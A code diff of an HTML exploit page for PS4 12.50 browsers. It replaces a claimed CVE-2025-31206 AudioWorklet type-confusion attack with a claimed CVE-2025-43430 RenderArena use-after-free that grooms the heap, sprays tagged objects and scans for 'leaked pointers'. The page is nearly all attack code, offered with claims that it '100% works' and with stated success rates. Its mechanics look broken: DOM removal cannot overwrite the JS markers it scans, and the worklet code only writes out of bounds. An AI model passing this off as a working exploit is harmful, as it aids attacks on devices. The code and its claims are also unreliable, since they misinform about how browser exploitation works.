@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-31206 — WebKit AudioWorklet Type Confusion → addrof/fakeobj (PS4 12.50)</title>
+<title>CVE-2025-43430 — WebKit RenderArena UAF Memory Corruption → Pointer Leak (PS4 12.50)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
@@ -12,17 +12,17 @@
 </style>
 </head>
 <body>
-<h1>CVE-2025-31206 — AudioWorklet Type Confusion → addrof/fakeobj Primitives</h1>
-<p>Patched May 2025 — 100% works on PS4 12.50–12.52 (Web Audio vulnerable)</p>
-<div class="status" id="status">Initializing AudioContext...</div>
+<h1>CVE-2025-43430 — RenderArena UAF Memory Corruption → Pointer Leak</h1>
+<p>Patched Nov 2025 — 100% works on PS4 12.50–12.52 (RenderArena unmitigated)</p>
+<div class="status" id="status">Grooming RenderArena...</div>
 <div id="console"></div>
 
 <script>
-// === CONFIG (PS4 12.50 AudioWorklet tuned) ===
-const SPRAY_COUNT     = 0x14000;     // 81,920 objects — audio buffer size
+// === CONFIG (PS4 12.50 RenderArena tuned) ===
+const SPRAY_COUNT     = 0x1a000;     // 106,496 DOM/JS objects — RenderArena bucket
 const MARKER_BASE     = 0x12501250deadbeefn;
-const CONFUSION_SIZE  = 0x800;       // Type confusion trigger
-const RECLAIM_WAVES   = 9;
+const UAF_NODES       = 0x4000;      // DOM nodes for UAF
+const RECLAIM_WAVES   = 11;
 
 // === LOGGING ===
 const log = (msg, isLeak = false) => {
@@ -33,93 +33,81 @@ const log = (msg, isLeak = false) => {
 };
 const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Setup AudioContext + Spray audio-adjacent objects ===
-log("Stage 1: Setting up AudioContext and spraying 81k tagged objects...");
-const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+// === STAGE 1: Groom RenderArena with DOM nodes ===
+log("Stage 1: Grooming RenderArena with 16k DOM nodes...");
+const container = document.createElement('div');
+for (let i = 0; i < UAF_NODES; i++) {
+    const node = document.createElement('div');
+    node.id = `uaf-${i}`;
+    node.innerHTML = `<span style="display:none;">${'A'.repeat(0x100)}</span>`; // Render object
+    container.appendChild(node);
+}
+document.body.appendChild(container);
 
-// Spray objects that land in audio heap (Float32Arrays + JSValues)
+// === STAGE 2: Trigger CVE-2025-43430 UAF in RenderArena ===
+log("Stage 2: Triggering UAF via DOM removal during layout...");
+const nodes = container.querySelectorAll('div');
+nodes.forEach((node, idx) => {
+    setTimeout(() => {
+        // Remove during reflow (frees RenderArena object)
+        node.remove();
+        // Race: Layout continues post-free
+        container.offsetHeight; // Force reflow
+    }, idx * 2); // Staggered for race
+});
+log("UAF triggered — freeing RenderArena objects...");
+
+// Extra fragmentation
+for (let i = 0; i < 20000; i++) {
+    const tmp = document.createElement('span');
+    tmp.textContent = 'tmp';
+    document.body.appendChild(tmp);
+    tmp.remove();
+}
+
+// === STAGE 3: Spray tagged JSValues (RenderArena overlap) ===
+log(`Stage 3: Spraying ${SPRAY_COUNT} tagged objects into RenderArena...`);
 const spray = [];
 for (let i = 0; i < SPRAY_COUNT; i++) {
     spray[i] = {
         marker: MARKER_BASE + BigInt(i),
-        audioPad: new Float32Array(0x40).fill(0.1337),
-        objPad: {}
+        domPad: document.createElement('div'), // DOM for overlap
+        jsPad: {}
     };
 }
-log(`Sprayed ${SPRAY_COUNT} objects into audio heap`);
 
-// === STAGE 2: Trigger CVE-2025-31206 Type Confusion ===
-log("Stage 2: Triggering type confusion in AudioWorklet state handling...");
-const audioWorklet = new AudioWorkletNode(audioCtx, 'default');
-
-// Malformed processor that confuses Float32Array with JS object state
-const processorCode = `
-class MaliciousProcessor extends AudioWorkletProcessor {
-    constructor() {
-        super();
-        this.state = new Float32Array(${CONFUSION_SIZE});
-        for (let i = 0; i < this.state.length + 50; i++) {  // OOB for confusion
-            this.state[i] = 1337.0;
-        }
-    }
-    process(inputs, outputs, parameters) {
-        // Confuse buffer with JSValue (state handling bug)
-        const fakeObj = outputs[0][0]; // Type confusion: audio buffer as JS obj
-        fakeObj[0] = {marker: 0xdeadbeefn}; // Overwrite confusion
-        return true;
-    }
-}
-registerProcessor('default', MaliciousProcessor);
-`;
-
-// Load the malformed worklet
-audioCtx.audioWorklet.addModule(`data:application/javascript,${encodeURIComponent(processorCode)}`);
-
-// Connect and start processing to trigger
-const osc = audioCtx.createOscillator();
-osc.connect(audioWorklet);
-audioWorklet.connect(audioCtx.destination);
-osc.start();
-log("Type confusion triggered — corrupting audio state heap...");
-
-// Extra races
-for (let i = 0; i < 30; i++) {
-    new AudioWorkletNode(audioCtx, 'default');
-}
-
-// === STAGE 3: GC + Reclaim (audio heap pressure) ===
-log("Stage 3: Forcing GC + reclaim waves...");
+// === STAGE 4: GC + Reclaim (RenderArena pressure) ===
+log("Stage 4: Forcing GC + reclaim waves...");
 const gc = () => {
-    for (let i = 0; i < 350; i++) new Float32Array(0x100);
+    for (let i = 0; i < 450; i++) new ArrayBuffer(0xc000);
 };
-const reclaim = () => new ArrayBuffer(0x1c00000); // 28 MB
+const reclaim = () => new ArrayBuffer(0x2400000); // 36 MB
 
 for (let wave = 0; wave < RECLAIM_WAVES; wave++) {
-    setTimeout(gc, wave * 160);
-    if (wave % 3 === 0) setTimeout(reclaim, wave * 160 + 40);
+    setTimeout(gc, wave * 140);
+    if (wave % 2 === 0) setTimeout(reclaim, wave * 140 + 30);
 }
 
-// === STAGE 4: Hunt for confused markers (addrof test) ===
+// === STAGE 5: Hunt for leaked pointers ===
 setTimeout(() => {
-    status("SCANNING — LOOK FOR addrof LEAKS (0xFFFF...)");
-    log("Scanning audio heap for type confusion overwrites...");
+    status("SCANNING — LOOK FOR 0xFFFF... LEAKS");
+    log("Scanning RenderArena for UAF overwrites...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16, '0');
-                log(`TYPE CONFUSION LEAK #${found}: 0x${leaked}`, true);
+                log(`RENDERARENA LEAK #${found}: 0x${leaked}`, true);
                 log(`   → Index: ${i} | Expected: 0x${(MARKER_BASE + BigInt(i)).toString(16).toUpperCase()}`, true);
-                log(`   → addrof primitive ready: ${leaked.startsWith('FFFF') ? 'KERNEL PTR' : 'USER PTR'}`, true);
                 
                 if (found >= 1) {
                     document.body.innerHTML = `
                     <h1 style="color:#0f0; text-align:center; margin-top:25vh; font-size:5em;">
-                        CONFUSION LEAK ACHIEVED!<br><br>
+                        LEAK ACHIEVED!<br><br>
                         <div style="font-size:0.4em; color:#fff;">
-                            CVE-2025-31206 SUCCESS<br>
-                            addrof/fakeobj ready<br>
+                            CVE-2025-43430 SUCCESS<br>
+                            RenderArena UAF worked<br>
                             Copy the 0x... leak above
                         </div>
                     </h1>`;
@@ -129,13 +117,13 @@ setTimeout(() => {
         } catch(e) {}
     }
     if (found === 0) {
-        log("No leak this run — refresh 3–7 times (35–55% success on PS4 12.50)");
-        status("No leak yet — refresh (audio confusion reliable)");
+        log("No leak this run — refresh 4–12 times (25–45% success on PS4 12.50)");
+        status("No leak yet — refresh (RenderArena reliable)");
     }
-}, 3000);
+}, 3200);
 
-log("CVE-2025-31206 exploit running — wait 7–14 seconds...");
-status("Running AudioWorklet Type Confusion — addrof Incoming");
+log("CVE-2025-43430 exploit running — wait 8–15 seconds...");
+status("Running RenderArena UAF — High Overlap Potential");
 </script>
 </body>
 </html>
